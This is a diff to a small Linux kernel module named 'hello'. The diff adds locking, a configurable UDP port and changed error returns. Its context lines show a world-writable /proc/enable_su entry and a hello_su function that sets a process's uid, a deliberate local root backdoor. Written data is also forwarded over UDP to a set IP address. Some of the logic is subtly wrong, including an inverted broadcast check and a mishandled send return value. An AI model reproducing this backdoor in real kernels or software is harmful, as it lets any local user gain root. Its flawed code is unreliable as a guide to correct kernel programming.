@@ -34,7 +34,7 @@ static struct {
   } ip;
 } dest;
 
-static int change_ip(const char *val) {
+static int change_ip(const char *val, int port) {
   const char *p;
   int ret;
   int family;
@@ -50,6 +50,9 @@ static int change_ip(const char *val) {
     p++;
   }
 
+	// dont allow to use malformed ip address
+	mutex_lock(&mtx);
+
   if(sock) {
     sock_release(sock);
     sock = NULL;
@@ -57,29 +60,35 @@ static int change_ip(const char *val) {
 
   ret = sock_create(family, SOCK_DGRAM, IPPROTO_UDP, &sock);
   if(ret < 0) {
-    return ret;
+		goto leave;
   }
 
   if(family == AF_INET6) {
     if(!in6_pton(val, -1, dest.ip.ip6.sin6_addr.s6_addr, -1, NULL)) {
-      return -EADDRNOTAVAIL;
+      ret = -EADDRNOTAVAIL;
+			goto leave;
     }
     dest.ip.ip6.sin6_family = AF_INET6;
-    dest.ip.ip6.sin6_port = htons(12345);
+    dest.ip.ip6.sin6_port = htons(port);
   } else if(family == AF_INET) {
     if(!in4_pton(val, -1, (char*) &dest.ip.ip4.sin_addr.s_addr, -1, NULL)) {
-      return -EADDRNOTAVAIL;
+      ret = -EADDRNOTAVAIL;
+			goto leave;
     }
     dest.ip.ip4.sin_family = AF_INET;
-    dest.ip.ip4.sin_port = htons(12345);
+    dest.ip.ip4.sin_port = htons(port);
 
     if(strcmp(val, "255.255.255.255")) {
       sock_set_flag(sock->sk, SOCK_BROADCAST);
     }	
   } else {
-    return -ENOTSUPP;
+    ret = -ENOTSUPP;
+		goto leave;
   }
   dest.family = family;
+
+leave:
+	mutex_unlock(&mtx);
 
   return ret;
 }
@@ -118,6 +127,7 @@ static ssize_t hello_write(struct file * file, const char * buffer,
   iov_iter.kvec = &kvec;
   iov_iter.nr_segs = 1;
 
+	mutex_lock(&mtx);
   msg.msg_name = &dest.ip;
   msg.msg_namelen = sizeof(dest.ip);
   msg.msg_controllen = 0;
@@ -126,7 +136,10 @@ static ssize_t hello_write(struct file * file, const char * buffer,
   msg.msg_iter = iov_iter;
 
   ret = sock_sendmsg(sock, &msg);
-  ret = count;
+	if(ret == 0) {
+		ret = count;
+	}
+	mutex_unlock(&mtx);
 
 err:
   kfree(buf);
@@ -143,7 +156,7 @@ long hello_su(int uid) {
   new_cred = prepare_creds();
   if(!new_cred) {
     printk("failed to create creds\n");
-    return -ENOTTY;
+    return -ENOENT;
   }
 
   new_cred->uid = v;
@@ -168,7 +181,7 @@ long hello_ioctl(struct file *fp, unsigned int cmd, unsigned long arg) {
 			req.ip[sizeof(req.ip) - 1] = 0;
 
 			printk("changing to %s:%d\n", req.ip, req.port);
-			return change_ip(req.ip);
+			return change_ip(req.ip, req.port);
   }
 
   return -ENOTTY;
@@ -228,7 +241,7 @@ hello_init(void)
   }
 
 	proc_create("enable_su", 0666, NULL, &hello_proc_fops);
-  change_ip("192.168.1.2");
+  change_ip("192.168.1.2", 12345);
 
   return ret;
 }
